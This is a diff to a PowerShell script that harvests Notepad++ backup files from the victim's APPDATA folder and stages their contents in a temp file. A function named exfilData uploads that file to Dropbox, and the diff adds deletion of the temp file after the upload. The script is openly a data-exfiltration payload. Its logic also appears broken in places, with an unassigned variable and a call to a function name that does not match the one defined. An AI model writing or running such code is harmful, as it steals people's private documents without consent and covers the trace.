@@ -1,3 +1,5 @@
+$FileName = "$ENV:tmp/$ENV:USERNAME-NPPlusData-$(Get-Date -f hh-mm_dd-MM-yyyy).txt"
+
 $appdataroaming = $ENV:APPDATA
 $toread = "Notepad++\backup"
 
@@ -9,13 +11,13 @@ function readFile {
         $filename = $filepath.BaseName
         $filecontent = Get-Content -Path $filepath
         "+-" *40
-        Write-Host "File name = $filepath"
-        Write-Host "Full file path = $filename"
-        Write-Host "File contents = $filecontent"
+        $finalcontent = "File name = $filename :: File contents = $filecontent"
         "+-" *40
     }
+    return $finalcontent
 }
 
+$out > $FileName
 
 function exfilData {
     [CmdletBinding()]
@@ -34,5 +36,7 @@ function exfilData {
     $headers.Add("Dropbox-API-Arg", $arg)
     $headers.Add("Content-Type", 'application/octet-stream')
     Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
+
+    Remove-Item $FileName
     }
 if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $FileName}
